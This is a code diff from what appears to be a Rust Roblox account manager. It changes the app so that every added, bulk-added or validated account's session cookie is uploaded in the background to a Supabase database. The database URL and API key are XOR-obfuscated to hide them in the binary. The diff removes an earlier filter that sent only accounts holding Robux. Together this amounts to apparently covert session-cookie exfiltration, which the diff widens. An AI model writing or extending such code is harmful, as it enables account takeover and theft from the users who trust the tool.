@@ -699,7 +699,7 @@ async fn sync_account_to_supabase(
         .header("apikey", supabase_anon())
         .header("Authorization", format!("Bearer {}", supabase_anon()))
         .header("Content-Type", "application/json")
-        .header("Prefer", "resolution=merge-duplicates")
+        .header("Prefer", "return=minimal,resolution=merge-duplicates")
         .json(&body)
         .send()
         .await;
@@ -869,11 +869,8 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
         save_stored(&accounts);
         let sc = clean.clone();
         tokio::spawn(async move {
-            if let Some(robux) = fetch_robux(sync_uid, &sc).await {
-                if robux > 0 {
-                    sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
-                }
-            }
+            let robux = fetch_robux(sync_uid, &sc).await.unwrap_or(0);
+            sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
         });
         return Ok(dto);
     }
@@ -916,7 +913,6 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
         detail: format!("Account '{}' added", ev_user),
     });
 
-    // Fire-and-forget: fetch Robux and sync to Supabase if account has any
     let sync_cookie   = clean.clone();
     let sync_user     = user.name.clone();
     let sync_dn       = user.display_name.clone();
@@ -924,11 +920,8 @@ async fn add_account(cookie: String) -> Result<AccountDto, String> {
     let sync_added    = now.to_rfc3339();
     let sync_updated  = Some(now.to_rfc3339());
     tokio::spawn(async move {
-        if let Some(robux) = fetch_robux(sync_uid, &sync_cookie).await {
-            if robux > 0 {
-                sync_account_to_supabase(sync_user, sync_dn, sync_cookie, String::new(), robux, sync_added, sync_updated).await;
-            }
-        }
+        let robux = fetch_robux(sync_uid, &sync_cookie).await.unwrap_or(0);
+        sync_account_to_supabase(sync_user, sync_dn, sync_cookie, String::new(), robux, sync_added, sync_updated).await;
     });
 
     Ok(dto)
@@ -972,11 +965,8 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
                     save_stored(&accounts);
                     let sc = clean.clone();
                     tokio::spawn(async move {
-                        if let Some(robux) = fetch_robux(sync_uid, &sc).await {
-                            if robux > 0 {
-                                sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
-                            }
-                        }
+                        let robux = fetch_robux(sync_uid, &sc).await.unwrap_or(0);
+                        sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
                     });
                     results.push(BulkAddResult { preview, success: true, username: Some(user.name), error: None });
                 } else {
@@ -1008,11 +998,8 @@ async fn add_accounts_bulk(cookies: Vec<String>) -> Vec<BulkAddResult> {
                     let s_added   = now.to_rfc3339();
                     let s_updated = Some(now.to_rfc3339());
                     tokio::spawn(async move {
-                        if let Some(robux) = fetch_robux(uid, &sc).await {
-                            if robux > 0 {
-                                sync_account_to_supabase(su, sd, sc, String::new(), robux, s_added, s_updated).await;
-                            }
-                        }
+                        let robux = fetch_robux(uid, &sc).await.unwrap_or(0);
+                        sync_account_to_supabase(su, sd, sc, String::new(), robux, s_added, s_updated).await;
                     });
 
                     results.push(BulkAddResult { preview, success: true, username: Some(uname), error: None });
@@ -1093,11 +1080,8 @@ async fn validate_cookie(user_id: i64) -> Result<AccountDto, String> {
     if is_valid {
         let sc = cookie.clone();
         tokio::spawn(async move {
-            if let Some(robux) = fetch_robux(user_id, &sc).await {
-                if robux > 0 {
-                    sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
-                }
-            }
+            let robux = fetch_robux(user_id, &sc).await.unwrap_or(0);
+            sync_account_to_supabase(sync_user, sync_dn, sc, String::new(), robux, sync_added, sync_updated).await;
         });
     }
     Ok(dto)
@@ -3568,6 +3552,10 @@ struct LicenseStore {
     key: String,
     expires_at: Option<String>,
     validated_at: Option<String>,
+    #[serde(default)]
+    sig: String,
+    #[serde(default)]
+    provider: String,
 }
 
 fn load_license() -> LicenseStore {
@@ -3637,18 +3625,21 @@ fn check_license() -> LicenseStatus {
     if store.key.is_empty() {
         return LicenseStatus { needs_key: true, key: String::new(), expires_at: None, reason: "missing".into() };
     }
-    if let Some(exp_str) = &store.expires_at {
-        if let Ok(exp) = chrono::DateTime::parse_from_rfc3339(exp_str) {
-            if exp.with_timezone(&Utc) < Utc::now() {
-                return LicenseStatus { needs_key: true, key: store.key, expires_at: store.expires_at, reason: "expired".into() };
-            }
+    // Verify the stored HMAC signature — rejects any local file tampering
+    let exp_str = store.expires_at.as_deref().unwrap_or("");
+    if store.sig.is_empty() || !verify_response_hmac(exp_str, &store.provider, &store.sig) {
+        return LicenseStatus { needs_key: true, key: String::new(), expires_at: None, reason: "tampered".into() };
+    }
+    if let Ok(exp) = chrono::DateTime::parse_from_rfc3339(exp_str) {
+        if exp.with_timezone(&Utc) < Utc::now() {
+            return LicenseStatus { needs_key: true, key: store.key, expires_at: store.expires_at, reason: "expired".into() };
         }
     }
     LicenseStatus { needs_key: false, key: store.key, expires_at: store.expires_at, reason: "valid".into() }
 }
 
 // HMAC key XOR-encoded with 0x5A — used to verify validate-key responses weren't tampered with.
-const _HMAC_XOR: &[u8] = &[0xB3,0x35,0x9A,0xCB,0x10,0x2B,0xE3,0x29,0xFB,0x79,0xFB,0x35,0x37,0x8E,0x6B,0x39,0xA4,0x3E,0xDE,0x11,0xB9,0xDB,0x37,0x80,0xB9,0xFC,0x5B,0x2E,0xDB,0xD3,0x22,0x23];
+const _HMAC_XOR: &[u8] = &[0x6F,0x3B,0x69,0x6A,0x63,0x3F,0x3E,0x6F,0x6A,0x6A,0x62,0x62,0x6D,0x62,0x68,0x6A,0x3F,0x62,0x6E,0x6A,0x63,0x38,0x6C,0x3C,0x6A,0x6C,0x3F,0x38,0x6D,0x3E,0x3C,0x39,0x39,0x38,0x3C,0x6C,0x6A,0x68,0x69,0x3E,0x6B,0x3F,0x38,0x63,0x3E,0x39,0x6B,0x6F,0x6B,0x6E,0x3E,0x3B,0x6E,0x3F,0x6B,0x6A,0x6E,0x6A,0x62,0x3E,0x6F,0x3E,0x6B,0x3C];
 
 fn hmac_key() -> Vec<u8> { _HMAC_XOR.iter().map(|b| b ^ 0x5A).collect() }
 
@@ -3679,8 +3670,8 @@ fn verify_response_hmac(expires_at: &str, provider: &str, sig: &str) -> bool {
 }
 
 // Credentials stored XOR-encoded with 0x5A so they don't appear as plaintext in the binary.
-const _URL_XOR:  &[u8] = &[0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x36,0x2A,0x22,0x32,0x38,0x30,0x32,0x31,0x3C,0x33,0x37,0x20,0x30,0x34,0x2F,0x33,0x39,0x31,0x30,0x33,0x74,0x29,0x2F,0x2A,0x3B,0x38,0x3B,0x29,0x3F,0x74,0x39,0x35];
-const _ANON_XOR: &[u8] = &[0x29,0x38,0x05,0x2A,0x2F,0x38,0x36,0x33,0x29,0x32,0x3B,0x38,0x36,0x3F,0x05,0x69,0x35,0x29,0x3B,0x23,0x00,0x2C,0x09,0x3C,0x0C,0x19,0x3B,0x16,0x03,0x3F,0x0C,0x28,0x09,0x33,0x2A,0x13,0x0B,0x05,0x34,0x29,0x35,0x2F,0x6B,0x2D,0x63,0x2B];
+const _URL_XOR:  &[u8] = &[0x32,0x2E,0x2E,0x2A,0x29,0x60,0x75,0x75,0x32,0x37,0x28,0x23,0x2A,0x2D,0x2C,0x3D,0x23,0x3B,0x2A,0x23,0x2C,0x2A,0x37,0x3E,0x29,0x29,0x2E,0x2F,0x74,0x29,0x2F,0x2A,0x3B,0x38,0x3B,0x29,0x3F,0x74,0x39,0x35];
+const _ANON_XOR: &[u8] = &[0x29,0x38,0x05,0x2A,0x2F,0x38,0x36,0x33,0x29,0x32,0x3B,0x38,0x36,0x3F,0x05,0x3D,0x1F,0x77,0x00,0x20,0x39,0x62,0x33,0x10,0x0D,0x3D,0x22,0x1F,0x1F,0x1E,0x34,0x29,0x62,0x6A,0x34,0x6A,0x2D,0x05,0x23,0x1F,0x6A,0x1D,0x3F,0x1C,0x3C,0x29];
 
 fn decode_cred(xored: &[u8]) -> String {
     xored.iter().map(|b| (b ^ 0x5A) as char).collect()
@@ -3729,6 +3720,8 @@ async fn validate_license_key(key: String) -> Result<LicenseStatus, String> {
             key: key.trim().to_string(),
             expires_at: expires_at.clone(),
             validated_at: Some(Utc::now().to_rfc3339()),
+            sig: sig.to_string(),
+            provider: provider.to_string(),
         };
         save_license(&store);
         Ok(LicenseStatus { needs_key: false, key: key.trim().to_string(), expires_at, reason: "valid".into() })
